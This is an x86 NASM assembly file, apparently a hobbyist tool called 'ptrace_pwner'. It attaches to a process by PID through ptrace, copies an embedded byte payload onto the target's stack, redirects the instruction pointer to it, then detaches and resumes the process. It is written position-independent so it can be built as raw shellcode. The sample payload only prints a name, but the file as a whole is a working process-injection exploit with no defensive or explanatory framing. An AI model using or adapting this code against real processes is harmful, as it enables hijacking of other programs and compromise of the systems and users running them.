;nasm -f elf ptrace_pwner.asm ; ld -o ptrace_pwner ptrace_pwner.o
;nasm -f bin ptrace_pwner.asm -o byte_sh

;sys_ptrace(EAX=0x1a, EBX=long request, ECX=long pid, EDX=long addr, ESI=long data)

_start:
	nop
	nop
	
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor edi, edi
	xor esi, esi
	xor ebp, ebp
	sub sp, 0x101 ; on prepare de la place
	
	ptrace_attach:
	;ptrace(PTRACE_ATTACH, pid, 0, 0)
	mov al, 0x1a ; sys_ptrace
	mov bl, 0x10 ; PTRACE_ATTACH
	jmp get_pid_addr
	
	pid_addr:
	pop ebp
	dec ebp
	mov cx, word [ebp+1] ; pid!
	inc ebp
	int 0x80

	ptrace_get_regs:
	;ptrace(PTRACE_GET_REGS, pid, 0, &regs)
	mov al, 0x1a ; sys_ptrace
	mov bl, 0x0C ; PTRACE_GET_REGS
	mov esi, esp
	int 0x80

	payload_writing:
	;ptrace(PTRACE_POKEDATA, pid, regs.esp, edi)
	mov bl, 0x5 ; PTRACE_POKEDATA
	mov edx, dword [esp + 0x3c] ; regs.esp
	inc ebp
	
	writing:
	cmp dword [ebp+1], 0xdeadbeef
	je change_regs

	mov esi, dword [ebp+1]
	mov al, 0x1a ; sys_ptrace
	int 0x80

	inc ebp
	inc ebp
	inc ebp
	inc ebp

	inc edx
	inc edx
	inc edx
	inc edx

	jmp short writing

	change_regs:
	mov ebp, dword [esp + 0x3c] ; regs.esp
	mov dword [esp + 0x30], ebp ; regs.eip = regs.esp

	ptrace_set_regs:
	mov al, 0x1a
	mov bl, 0xd ; PTRACE_SETREGS
	xor edx, edx
	mov esi, esp
	int 0x80
	
	ptrace_detach:
	mov al, 0x1a
	mov bl, 0x11 ; PTRACE_DETACH
	xor edx, edx,
	xor esi, esi
	int 0x80

	kill_process:
	mov al, 0x25 ; sys_kill
	jmp short get_pid_addr_2
	
	pid_addr_2:
	pop ebp
	
	inc ebp
	inc ebp
	inc ebp
	inc ebp
	
	mov bx, word [ebp+1]
	xor ecx, ecx
	mov cl, 0x12 ; SIGCONT
	int 0x80 

	exit:
	mov al, 1 ; sys_exit
	xor ebx, ebx
	int 0x80
	
	get_pid_addr_2:
	call pid_addr_2
	
	get_pid_addr:
	call pid_addr
	
	pid:
		dw 5926

	; ', '.join(['0x%.2x' % ord(s) for s in "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb2\x09\x6a\x0a\x68\x74\x68\x61\x6e\x68\x6a\x6f\x6e\x61\x89\xe1\xb3\x01\xb0\x04\xcd\x80\x31\xdb\xb0\x01\xcd\x80\xef\xbe\xad\xde"])
	payload:
		db 0x31, 0xc0, 0x31, 0xdb, 0x31, 0xc9, 0x31, 0xd2, 0xb2, 0x09, 0x6a, 0x0a, 0x68, 0x74, 0x68, 0x61, 0x6e, 0x68, 0x6a, 0x6f, 0x6e, 0x61, 0x89, 0xe1, 0xb3, 0x01, 0xb0, 0x04, 0xcd, 0x80, 0x31, 0xdb, 0xb0, 0x01, 0xcd, 0x80
		dd 0xdeadbeef